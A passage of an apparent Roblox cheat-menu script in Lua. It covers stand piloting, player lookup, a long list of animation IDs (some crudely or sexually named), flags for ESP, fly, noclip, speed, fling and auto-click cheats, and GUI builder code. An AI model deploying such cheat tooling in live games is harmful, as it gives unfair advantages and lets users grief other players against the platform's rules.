		local MoveDirection = Camera.CFrame:VectorToObjectSpace(Humanoid.MoveDirection)
		StandHumanoid:Move(MoveDirection, true)
		
		if settings["hidebody"] then
			CurrentCharacter.PrimaryPart.CFrame = StandMorph.PrimaryPart.CFrame+Vector3.new(0,-settings["bodydistance"],0)
		end
	end)
	
	StandMorph:FindFirstChild("AlignOrientation", true).Enabled = false
	StandMorph:FindFirstChild("AlignPosition", true).Enabled = false
	for i,v in StandMorph:GetDescendants() do
	    if v:IsA("BasePart") or v:IsA("UnionOperation") then
	        game:GetService("PhysicsService"):SetPartCollisionGroup(v, "Players")
	    end
	end
	return PilotFunctions
end

local function UnPilotStand(Returned)
	UpdateIndex()
	
	for i,v in game.ReplicatedStorage.TempStorage:GetChildren() do
		if v.Name == "Naples' Sewers" then
			v.Parent = workspace.Locations
		end
	end

	for x,v in Returned do
		if tostring(v) == "Connection" then
			v:Disconnect()
		end
	end
	
	Returned["FocusCam"]:Destroy()
	
	CurrentCharacter.PrimaryPart.Velocity = Vector3.new()
	if settings["tpbodytostand"] then
		CurrentCharacter.PrimaryPart.CFrame = StandMorph.PrimaryPart.CFrame
	else
		CurrentCharacter.PrimaryPart.CFrame = Returned["CFrame"]
	end
	
	StandMorph:FindFirstChild("AlignOrientation", true).Enabled = true
	StandMorph:FindFirstChild("AlignPosition", true).Enabled = true
	for i,v in StandMorph:GetDescendants() do
	    if v:IsA("BasePart") or v:IsA("UnionOperation") then
	        game:GetService("PhysicsService"):SetPartCollisionGroup(v, "Stands")
	    end
	end
	
	if not settings["hidebody"] then
		CurrentCharacter.PrimaryPart.Anchored = false
	end
end

-- EnablePilot / DisablePilot
local function EnablePilot()
    repeat task.wait() until Character:FindFirstChild("StandMorph")
    UpdateIndex()

    settings["1"] = SummonedStand:GetPropertyChangedSignal("Value"):Connect(function()
        if not SummonedStand.Value then
            StayInPilot.Value = false
        end
    end)

    settings["2"] = UserInputService.InputBegan:Connect(function(InputObject)
        if UserInputService:GetFocusedTextBox() then
            return
        end

        if InputObject.KeyCode == settings["pilotkey"] then
            StayInPilot.Value = not StayInPilot.Value
        end
    end)

    settings["3"] = StayInPilot:GetPropertyChangedSignal("Value"):Connect(function()
        if StayInPilot.Value then
            settings["currentargs"] = PilotStand()
        else
            UnPilotStand(settings["currentargs"])
        end
    end)
end

local function DisablePilot()
    if settings["1"] then settings["1"]:Disconnect() end
    if settings["2"] then settings["2"]:Disconnect() end
    if settings["3"] then settings["3"]:Disconnect() end

    if settings["currentargs"] then
        UnPilotStand(settings["currentargs"])
        StayInPilot.Value = false
    end
end
-- ========================================

-- ========================================
-- Stand Attach Functions
-- ========================================
local function GetStand()
    if Character and Character:FindFirstChild("StandMorph") then
        return Character.StandMorph
    end
    return nil
end

local function SearchPlayer(Name)
    local ClosestMatch = nil
    local ClosestLetters = 0
    for i,v in workspace.Living:GetChildren() do
        local matched_letters = 0
        for i = 1, #Name do
            if string.sub(Name:lower(), 1, i) == string.sub(v.Name:lower(), 1, i) then
                matched_letters = i
            end
        end
        if matched_letters > ClosestLetters then
            ClosestLetters = matched_letters
            ClosestMatch = v
        end
    end
    return ClosestMatch
end

-- Invisibility Variables
local Highlight = nil
local UndergroundAnimation = nil
local isInvisible = false

-- Animation Variables
local animPlayerActive = {}
local animPlayerConnections = {}

local animations = {
    {name = "Twerk", id = 12874447851, speed = 1.5, timepos = 3.90, looped = true, freezeonend = false},
    {name = "California Girls", id = 124982597491660, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Helicopter", id = 95301257497525, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Helicopter 2", id = 122951149300674, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Helicopter 3", id = 91257498644328, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Da Hood Dance", id = 108171959207138, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Da Hood Stomp", id = 115048845533448, speed = 1.4, timepos = 0, looped = true, freezeonend = false},
    {name = "Flopping Fish", id = 79075971527754, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Gangnam Style", id = 100531289776679, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Caramelldansen", id = 88315693621494, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Air Circle", id = 94324173536622, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Heart Left", id = 110936682778213, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Heart Right", id = 84671941093489, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "67", id = 115439144505157, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "6", id = 115439144505157, speed = 0, timepos = 0.2, looped = false, freezeonend = false},
    {name = "7", id = 115439144505157, speed = 0, timepos = 1.2, looped = false, freezeonend = false},
    {name = "Dog", id = 78195344190486, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "MM2 Zen", id = 86872878957632, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Default Dance", id = 88455578674030, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Sit", id = 97185364700038, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Kazotsky Kick", id = 119264600441310, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Fight Stance", id = 116763940575803, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Oh Who Is You", id = 81389876138766, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Sway Sit", id = 130995344283026, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Sway Sit 2", id = 131836270858895, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "The Worm", id = 90333292347820, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Snake", id = 98476854035224, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Peter Griffin Death", id = 129787664584610, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Walter Scene", id = 113475147402830, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Cute Stomach Lay", id = 80754582835479, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Shadow Dio Pose", id = 92266904563270, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Jotaro Pose", id = 122120443600865, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Jojo Pose", id = 120629563851640, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Float Lay", id = 77840765435893, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Biblically Accurate", id = 109873544976020, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Headless", id = 78837807518622, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "ME!ME!ME!", id = 103235915424832, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Plane", id = 82135680487389, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "XavierSoBased", id = 90802740360125, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Chinese Dance", id = 131758838511368, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Slickback", id = 74288964113793, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Car", id = 108747312576405, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Beat Da Koto Nai", id = 93497729736287, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Tank", id = 94915612757079, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Classic Walk", id = 107806791584829, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Weird Creature", id = 87025086742503, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Skibidi Toilet", id = 127154705636043, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Rolling Crybaby", id = 129699431093711, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Thinking", id = 127088545449493, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Fake Death", id = 88130117312312, speed = 1, timepos = 0, looped = false, freezeonend = true},
    {name = "Laced", id = 135611169366768, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Fit Check", id = 81176957565811, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Surrender", id = 100537772865440, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Assumptions", id = 91294374426630, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Griddy", id = 121966805049108, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Take The L", id = 78653596566468, speed = 1, timepos = 0, looped = true, freezeonend = true},
    {name = "Basketball Head Spin", id = 92854797386719, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Parrot Dance", id = 101810746304426, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Shot", id = 102691551292124, speed = 1, timepos = 0, looped = false, freezeonend = true},
    {name = "Ragdoll", id = 136224735234038, speed = 1, timepos = 0, looped = false, freezeonend = true},
    {name = "Sad Sit", id = 100798804992348, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Soda Pop", id = 105459130960429, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Billy Bounce", id = 137501135905857, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Ballin", id = 119242308765484, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Jackhammer", id = 91423662648449, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Monster Mash", id = 137883764619555, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Fumo Plush", id = 107217181254431, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Rizz Backflip", id = 131205329995035, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Float", id = 89523370947906, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Hi", id = 103041144411206, speed = 1, timepos = 0, looped = false, freezeonend = true},
    {name = "Posessed", id = 90708290447388, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Fuck you!", id = 98289978017308, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Silver Surfer", id = 100663712757148, speed = 0.8, timepos = 0, looped = true, freezeonend = false},
    {name = "Tall Thing Idk", id = 118864464720628, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Cat Sit", id = 99424293618796, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Black Flash", id = 104767795538635, speed = 1, timepos = 0, looped = true, freezeonend = false},
    {name = "Jerk Off", id = 72042024, speed = 0.65, timepos = 0.6, looped = true, freezeonend = false, isJerk = true},
}

local function stopAllAnimations()
    for key, conn in pairs(animPlayerConnections) do
        if conn and typeof(conn) == "RBXScriptConnection" then
            conn:Disconnect()
        end
    end
    animPlayerConnections = {}
    
    for key, track in pairs(animPlayerActive) do
        if track then
            pcall(function() track:Stop() end)
        end
    end
    animPlayerActive = {}
end

-- Ghost Hub Variables
_G.PredictValue = 0.30
_G.AutoClicker = false
_G.IsResetting = false
local vim = game:GetService("VirtualInputManager")
local VirtualUser = game:GetService("VirtualUser")
local gh_selectedPlayer = nil
local gh_isRunning = false
local gh_isFlingActive = false
local gh_isAutoResetEnabled = false
local gh_resetInterval = 5
local gh_currentBV = nil
local autoClickerRunning = false

-- Physics Lab Variables
local seismicActive = false
local vacuumActive = false
local kickActive = false
local spiderMode = false
local airWalk = false
local flying_physics = false
local unshakeable = false
local blackholeActive = false
local airWalkPlate = nil

-- ESP Variables
local espBoxEnabled = false
local espNameEnabled = false
local espDistanceEnabled = false
local espTracerEnabled = false
local espBoxColor = Color3.fromRGB(100, 80, 200)
local espFontSize = 14

local flyEnabled = false
local flySpeed = 50
local flyKeybind = Enum.KeyCode.Tab
local waitingForFlyKey = false
local invisKeybind = Enum.KeyCode.L
local waitingForInvisKey = false
local bv, bg = nil, nil
local noclipEnabled = false
local speedHackEnabled = false
local walkSpeed = 16
local jumpHackEnabled = false
local jumpPower = 50

-- Create ScreenGui
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "SecretClubGUI_Complete"
ScreenGui.ResetOnSpawn = false
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.IgnoreGuiInset = true
ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")

-- Main Container
local MainFrame = Instance.new("Frame")
MainFrame.Name = "MainFrame"
MainFrame.Size = UDim2.new(0, 692, 0, 558)
MainFrame.Position = UDim2.new(0.5, -346, 0.5, -279)
MainFrame.BackgroundColor3 = Color3.fromRGB(18, 16, 24)
MainFrame.BorderSizePixel = 0
MainFrame.Active = true
MainFrame.ClipsDescendants = true
MainFrame.Parent = ScreenGui

local MainFrameCorner = Instance.new("UICorner")
MainFrameCorner.CornerRadius = UDim.new(0, 16)
MainFrameCorner.Parent = MainFrame


-- Custom Dragging
local dragging = false
local dragInput, dragStart, startPos

local function updateDrag(input)
    local delta = input.Position - dragStart
    MainFrame.Position = UDim2.new(
        startPos.X.Scale, startPos.X.Offset + delta.X,
        startPos.Y.Scale, startPos.Y.Offset + delta.Y
    )
end

-- Top Bar
local TopBar = Instance.new("Frame")
TopBar.Name = "TopBar"
TopBar.Size = UDim2.new(1, 0, 0, 60)
TopBar.BackgroundColor3 = Color3.fromRGB(16, 14, 22)
TopBar.BorderSizePixel = 0
TopBar.Parent = MainFrame
TopBar.Active = true

TopBar.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        local mousePos = UserInputService:GetMouseLocation()
        local clickedOnButton = false
        
        for _, child in pairs(TopBar:GetChildren()) do
            if child:IsA("TextButton") or child:IsA("TextLabel") then
                local childPos = child.AbsolutePosition
                local childSize = child.AbsoluteSize
                if mousePos.X >= childPos.X and mousePos.X <= childPos.X + childSize.X and
                   mousePos.Y >= childPos.Y and mousePos.Y <= childPos.Y + childSize.Y then
                    clickedOnButton = true
                    break
                end
            end
        end
        
        if not clickedOnButton then
            dragging = true
            dragStart = input.Position
            startPos = MainFrame.Position
            
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragging = false
                end
            end)
        end
    end
end)

TopBar.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement then
        dragInput = input
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if input == dragInput and dragging then
        updateDrag(input)
    end
end)

-- SECRETCLUB Logo
local Logo = Instance.new("TextLabel")
Logo.Size = UDim2.new(0, 150, 1, 0)
Logo.Position = UDim2.new(0, 24, 0, 0)
Logo.BackgroundTransparency = 1
Logo.Text = "SECRETCLUB"
Logo.Font = Enum.Font.GothamBold
Logo.TextSize = 18
Logo.TextColor3 = Color3.fromRGB(255, 255, 255)
Logo.TextXAlignment = Enum.TextXAlignment.Left
Logo.Parent = TopBar

-- Save Button
local SaveButton = Instance.new("TextButton")
SaveButton.Size = UDim2.new(0, 70, 0, 28)
SaveButton.Position = UDim2.new(0, 190, 0, 16)
SaveButton.BackgroundColor3 = Color3.fromRGB(22, 20, 30)
SaveButton.Text = "💾  Save"
SaveButton.Font = Enum.Font.Gotham
SaveButton.TextSize = 12
SaveButton.TextColor3 = Color3.fromRGB(160, 160, 160)
SaveButton.BorderSizePixel = 0
SaveButton.Parent = TopBar

local SaveCorner = Instance.new("UICorner")
SaveCorner.CornerRadius = UDim.new(0, 20)
SaveCorner.Parent = SaveButton

SaveButton.MouseEnter:Connect(function()
    TweenService:Create(SaveButton, TweenInfo.new(0.1), {BackgroundColor3 = Color3.fromRGB(28, 26, 36)}):Play()
end)
SaveButton.MouseLeave:Connect(function()
    TweenService:Create(SaveButton, TweenInfo.new(0.1), {BackgroundColor3 = Color3.fromRGB(22, 20, 30)}):Play()
end)

-- Config Dropdown
local ConfigDropdown = Instance.new("TextButton")
ConfigDropdown.Size = UDim2.new(0, 120, 0, 28)
ConfigDropdown.Position = UDim2.new(0, 270, 0, 16)
ConfigDropdown.BackgroundColor3 = Color3.fromRGB(22, 20, 30)
ConfigDropdown.Text = "Global                 ▼"
ConfigDropdown.Font = Enum.Font.Gotham
ConfigDropdown.TextSize = 12
ConfigDropdown.TextColor3 = Color3.fromRGB(160, 160, 160)
ConfigDropdown.BorderSizePixel = 0
ConfigDropdown.Parent = TopBar

local ConfigCorner = Instance.new("UICorner")
ConfigCorner.CornerRadius = UDim.new(0, 20)
ConfigCorner.Parent = ConfigDropdown

-- Settings Icon
local SettingsBtn = Instance.new("TextButton")
SettingsBtn.Size = UDim2.new(0, 32, 0, 28)
SettingsBtn.Position = UDim2.new(1, -42, 0, 16)
SettingsBtn.BackgroundColor3 = Color3.fromRGB(22, 20, 30)
SettingsBtn.Text = "⚙"
SettingsBtn.Font = Enum.Font.GothamBold
SettingsBtn.TextSize = 16
SettingsBtn.TextColor3 = Color3.fromRGB(160, 160, 160)
SettingsBtn.BorderSizePixel = 0
SettingsBtn.Parent = TopBar

local SettingsCorner = Instance.new("UICorner")
SettingsCorner.CornerRadius = UDim.new(0, 20)
SettingsCorner.Parent = SettingsBtn

-- Left Sidebar
local Sidebar = Instance.new("ScrollingFrame")
Sidebar.Name = "Sidebar"
Sidebar.Size = UDim2.new(0, 175, 1, -60)
Sidebar.Position = UDim2.new(0, 0, 0, 60)
Sidebar.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Sidebar.BorderSizePixel = 0
Sidebar.BackgroundTransparency = 0
Sidebar.ScrollBarThickness = 4
Sidebar.ScrollBarImageColor3 = Color3.fromRGB(0, 0, 0)
Sidebar.CanvasSize = UDim2.new(0, 0, 0, 550)
Sidebar.Parent = MainFrame

local allButtons = {}
local currentActiveButton = nil

local function createSidebarLabel(text, yPos)
    local Label = Instance.new("TextLabel")
    Label.Size = UDim2.new(1, -24, 0, 18)
    Label.Position = UDim2.new(0, 24, 0, yPos)
    Label.BackgroundTransparency = 1
    Label.Text = text
    Label.Font = Enum.Font.Gotham
    Label.TextSize = 10
    Label.TextColor3 = Color3.fromRGB(100, 100, 100)
    Label.TextXAlignment = Enum.TextXAlignment.Left
    Label.Parent = Sidebar
    return Label
end

local function createSidebarButton(iconText, text, yPos, isActive, iconColor, tabPage)
    local Button = Instance.new("TextButton")
    Button.Name = text
    Button.Size = UDim2.new(1, -20, 0, 34)
    Button.Position = UDim2.new(0, 10, 0, yPos)    
    Button.BackgroundColor3 = isActive and Color3.fromRGB(80, 60, 140) or Color3.fromRGB(16, 14, 22)
    Button.Text = ""
    Button.BorderSizePixel = 0
    Button.Parent = Sidebar
    
    local Corner = Instance.new("UICorner")
    Corner.CornerRadius = UDim.new(0, 20)
    Corner.Parent = Button
    
    local Icon = Instance.new("TextLabel")
    Icon.Name = "Icon"
    Icon.Size = UDim2.new(0, 20, 1, 0)
    Icon.Position = UDim2.new(0, 10, 0, 0)
    Icon.BackgroundTransparency = 1
    Icon.Text = iconText
    Icon.Font = Enum.Font.GothamBold
    Icon.TextSize = 14
    Icon.TextColor3 = iconColor or Color3.fromRGB(100, 80, 200)
    Icon.TextXAlignment = Enum.TextXAlignment.Left
    Icon.Parent = Button
    
    local Label = Instance.new("TextLabel")
    Label.Size = UDim2.new(1, -40, 1, 0)
    Label.Position = UDim2.new(0, 36, 0, 0)
    Label.BackgroundTransparency = 1
    Label.Text = text
    Label.Font = Enum.Font.Gotham
    Label.TextSize = 13
    Label.TextColor3 = Color3.fromRGB(200, 200, 200)
    Label.TextXAlignment = Enum.TextXAlignment.Left
    Label.Parent = Button
    
    table.insert(allButtons, {Button = Button, Page = tabPage})
    
    Button.MouseButton1Click:Connect(function()
        if currentActiveButton then
            TweenService:Create(currentActiveButton, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(16, 14, 22)}):Play()
        end
        for _, data in pairs(allButtons) do
            if data.Page then data.Page.Visible = false end
        end
        if tabPage then tabPage.Visible = true end
        currentActiveButton = Button
        TweenService:Create(Button, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(80, 60, 140)}):Play()
    end)
    
    Button.MouseEnter:Connect(function()
        if Button ~= currentActiveButton then
            TweenService:Create(Button, TweenInfo.new(0.1), {BackgroundColor3 = Color3.fromRGB(26, 24, 34)}):Play()
        end
    end)
    Button.MouseLeave:Connect(function()
        if Button ~= currentActiveButton then
            TweenService:Create(Button, TweenInfo.new(0.1), {BackgroundColor3 = Color3.fromRGB(16, 14, 22)}):Play()
        end
    end)
    
    return Button
end

-- Content Area
local ContentArea = Instance.new("Frame")
ContentArea.Name = "ContentArea"
ContentArea.Size = UDim2.new(1, -175, 1, -60)
ContentArea.Position = UDim2.new(0, 175, 0, 60)
ContentArea.BackgroundColor3 = Color3.fromRGB(18, 16, 24)
ContentArea.BorderSizePixel = 0
ContentArea.Parent = MainFrame

local function createPage()
    local ScrollFrame = Instance.new("ScrollingFrame")
    ScrollFrame.Size = UDim2.new(1, -24, 1, -24)
    ScrollFrame.Position = UDim2.new(0, 12, 0, 12)
    ScrollFrame.BackgroundTransparency = 1
    ScrollFrame.BorderSizePixel = 0
    ScrollFrame.ScrollBarThickness = 0
    ScrollFrame.ScrollingEnabled = true
    ScrollFrame.CanvasSize = UDim2.new(0, 0, 0, 600)
    ScrollFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y
    ScrollFrame.Visible = false
    ScrollFrame.Parent = ContentArea
    
    local LeftColumn = Instance.new("Frame")
    LeftColumn.Name = "LeftColumn"
    LeftColumn.Size = UDim2.new(0.48, 0, 1, 0)
    LeftColumn.Position = UDim2.new(0, 0, 0, 0)
    LeftColumn.BackgroundTransparency = 1
    LeftColumn.Parent = ScrollFrame
    
    local LeftLayout = Instance.new("UIListLayout")
    LeftLayout.SortOrder = Enum.SortOrder.LayoutOrder
    LeftLayout.Padding = UDim.new(0, 3)
    LeftLayout.Parent = LeftColumn
    
    local RightColumn = Instance.new("Frame")
    RightColumn.Name = "RightColumn"
    RightColumn.Size = UDim2.new(0.48, 0, 1, 0)
    RightColumn.Position = UDim2.new(0.52, 0, 0, 0)
    RightColumn.BackgroundTransparency = 1
    RightColumn.Parent = ScrollFrame
    
    local RightLayout = Instance.new("UIListLayout")
    RightLayout.SortOrder = Enum.SortOrder.LayoutOrder
    RightLayout.Padding = UDim.new(0, 3)
    RightLayout.Parent = RightColumn
    
    return ScrollFrame, LeftColumn, RightColumn
end

-- Helper Functions
local function createSectionHeader(text)
    local Header = Instance.new("TextLabel")
    Header.Size = UDim2.new(1, 0, 0, 28)
    Header.BackgroundTransparency = 1
    Header.Text = text
    Header.Font = Enum.Font.GothamBold
    Header.TextSize = 13
    Header.TextColor3 = Color3.fromRGB(240, 240, 240)
    Header.TextXAlignment = Enum.TextXAlignment.Left
    return Header
end

local function createToggle(parent, labelText, defaultValue, callback)
    local Toggle = Instance.new("Frame")
    Toggle.Size = UDim2.new(1, 0, 0, 24)
    Toggle.BackgroundTransparency = 1
    Toggle.Parent = parent
    
    local Label = Instance.new("TextLabel")
    Label.Size = UDim2.new(1, -25, 1, 0)
    Label.BackgroundTransparency = 1
    Label.Text = labelText
    Label.Font = Enum.Font.Gotham
    Label.TextSize = 12
    Label.TextColor3 = Color3.fromRGB(180, 180, 180)
    Label.TextXAlignment = Enum.TextXAlignment.Left
    Label.Parent = Toggle
    
    local Switch = Instance.new("TextButton")
    Switch.Name = "ToggleSwitch"
    Switch.Size = UDim2.new(0, 16, 0, 16)
    Switch.Position = UDim2.new(1, -16, 0.5, -8)
    Switch.BackgroundColor3 = defaultValue and Color3.fromRGB(100, 80, 200) or Color3.fromRGB(40, 38, 48)
    Switch.Text = ""
    Switch.BorderSizePixel = 0
    Switch.Parent = Toggle
    
    local SwitchCorner = Instance.new("UICorner")
    SwitchCorner.CornerRadius = UDim.new(1, 0)
    SwitchCorner.Parent = Switch
    
    local toggled = defaultValue
    
    Switch.MouseButton1Click:Connect(function()
        toggled = not toggled
        TweenService:Create(Switch, TweenInfo.new(0.15), {
            BackgroundColor3 = toggled and Color3.fromRGB(100, 80, 200) or Color3.fromRGB(40, 38, 48)
        }):Play()
        if callback then callback(toggled) end
    end)
    
    return Toggle
end

local function createSlider(parent, labelText, min, max, default, callback)
    local Slider = Instance.new("Frame")
    Slider.Size = UDim2.new(1, 0, 0, 24)
    Slider.BackgroundTransparency = 1
    Slider.Parent = parent
    
    local Label = Instance.new("TextLabel")
    Label.Size = UDim2.new(0.40, 0, 1, 0)
    Label.BackgroundTransparency = 1
    Label.Text = labelText
    Label.Font = Enum.Font.Gotham
    Label.TextSize = 12
    Label.TextColor3 = Color3.fromRGB(180, 180, 180)
    Label.TextXAlignment = Enum.TextXAlignment.Left
    Label.Parent = Slider
    
    local Value = Instance.new("TextLabel")
    Value.Size = UDim2.new(0, 30, 1, 0)
    Value.Position = UDim2.new(1, -30, 0, 0)
    Value.BackgroundTransparency = 1
    Value.Text = tostring(default)
    Value.Font = Enum.Font.Gotham
    Value.TextSize = 12
    Value.TextColor3 = Color3.fromRGB(120, 120, 120)
    Value.TextXAlignment = Enum.TextXAlignment.Right
    Value.Parent = Slider
    
    local SliderBack = Instance.new("Frame")
    SliderBack.Size = UDim2.new(0.45, 0, 0, 3)
    SliderBack.Position = UDim2.new(0.43, 0, 0.5, -1.5)
    SliderBack.BackgroundColor3 = Color3.fromRGB(26, 24, 34)
    SliderBack.BorderSizePixel = 0
    SliderBack.Parent = Slider
    
    local SliderFill = Instance.new("Frame")
    SliderFill.Name = "SliderFill"
    SliderFill.Size = UDim2.new((default - min) / (max - min), 0, 1, 0)
    SliderFill.BackgroundColor3 = Color3.fromRGB(100, 80, 200)
    SliderFill.BorderSizePixel = 0
    SliderFill.Parent = SliderBack
    
    local SliderDot = Instance.new("Frame")
    SliderDot.Name = "SliderDot"
    SliderDot.Size = UDim2.new(0, 10, 0, 10)
    SliderDot.Position = UDim2.new((default - min) / (max - min), -5, 0.5, -5)
    SliderDot.BackgroundColor3 = Color3.fromRGB(100, 80, 200)
    SliderDot.BorderSizePixel = 0
    SliderDot.Parent = SliderBack
    
    local DotCorner = Instance.new("UICorner")
    DotCorner.CornerRadius = UDim.new(1, 0)
    DotCorner.Parent = SliderDot
    
    local sliderDragging = false
    
    SliderBack.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            sliderDragging = true
        end
    end)
    
    UserInputService.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            sliderDragging = false
        end
    end)
    
    UserInputService.InputChanged:Connect(function(input)
        if sliderDragging and input.UserInputType == Enum.UserInputType.MouseMovement then
            local mouse = UserInputService:GetMouseLocation().X
            local sliderPos = SliderBack.AbsolutePosition.X
            local sliderSize = SliderBack.AbsoluteSize.X
            
            local percent = math.clamp((mouse - sliderPos) / sliderSize, 0, 1)
            local value = math.floor(min + (max - min) * percent)
            
            Value.Text = tostring(value)
            SliderFill.Size = UDim2.new(percent, 0, 1, 0)
            SliderDot.Position = UDim2.new(percent, -5, 0.5, -5)
            
            if callback then callback(value) end
        end
    end)
    
    return Slider
end

local function createTextBox(parent, labelText, placeholderText, callback)
    local Container = Instance.new("Frame")
    Container.Size = UDim2.new(1, 0, 0, 34)
    Container.BackgroundTransparency = 1
    Container.Parent = parent
    
    local Label = Instance.new("TextLabel")
    Label.Size = UDim2.new(0.35, 0, 1, 0)
    Label.BackgroundTransparency = 1
    Label.Text = labelText
    Label.Font = Enum.Font.Gotham
    Label.TextSize = 12
    Label.TextColor3 = Color3.fromRGB(180, 180, 180)
    Label.TextXAlignment = Enum.TextXAlignment.Left
    Label.Parent = Container
    
    local TextBox = Instance.new("TextBox")
    TextBox.Size = UDim2.new(0.60, 0, 0, 28)
    TextBox.Position = UDim2.new(0.40, 0, 0.5, -14)
    TextBox.BackgroundColor3 = Color3.fromRGB(22, 20, 30)
    TextBox.Text = ""
    TextBox.PlaceholderText = placeholderText
    TextBox.Font = Enum.Font.Gotham
    TextBox.TextSize = 11
    TextBox.TextColor3 = Color3.fromRGB(200, 200, 200)
    TextBox.BorderSizePixel = 0
    TextBox.Parent = Container
    
    local TextBoxCorner = Instance.new("UICorner")
    TextBoxCorner.CornerRadius = UDim.new(0, 20)
    TextBoxCorner.Parent = TextBox
    
    if callback then
        TextBox.FocusLost:Connect(function()
            callback(TextBox.Text)
        end)
    end
    
    return Container, TextBox
end

local function createButton(parent, text, callback)
    local Button = Instance.new("TextButton")
    Button.Size = UDim2.new(1, 0, 0, 32)
    Button.BackgroundColor3 = Color3.fromRGB(22, 20, 30)
    Button.Text = text
    Button.Font = Enum.Font.Gotham
    Button.TextSize = 12
    Button.TextColor3 = Color3.fromRGB(200, 200, 200)
    Button.BorderSizePixel = 0
    Button.Parent = parent
    
    local ButtonCorner = Instance.new("UICorner")
    ButtonCorner.CornerRadius = UDim.new(0, 20)
    ButtonCorner.Parent = Button
    
    Button.MouseEnter:Connect(function()
        TweenService:Create(Button, TweenInfo.new(0.1), {BackgroundColor3 = Color3.fromRGB(28, 26, 36)}):Play()
    end)
    Button.MouseLeave:Connect(function()
        TweenService:Create(Button, TweenInfo.new(0.1), {BackgroundColor3 = Color3.fromRGB(22, 20, 30)}):Play()
    end)
    
    if callback then
        Button.MouseButton1Click:Connect(callback)
    end
    
    return Button
end

-- ========================================
-- INVISIBILITY FUNCTIONS
-- ========================================

function PlayAnimation(HumanoidCharacter, AnimationID, AnimationSpeed, Time)
    HumanoidCharacter = Character
    local CreatedAnimation = Instance.new("Animation")
    CreatedAnimation.AnimationId = AnimationID
    local HumanoidEx = HumanoidCharacter:FindFirstChild("Humanoid")
    
    if not HumanoidEx then
        repeat task.wait() until HumanoidCharacter:FindFirstChild("Humanoid")
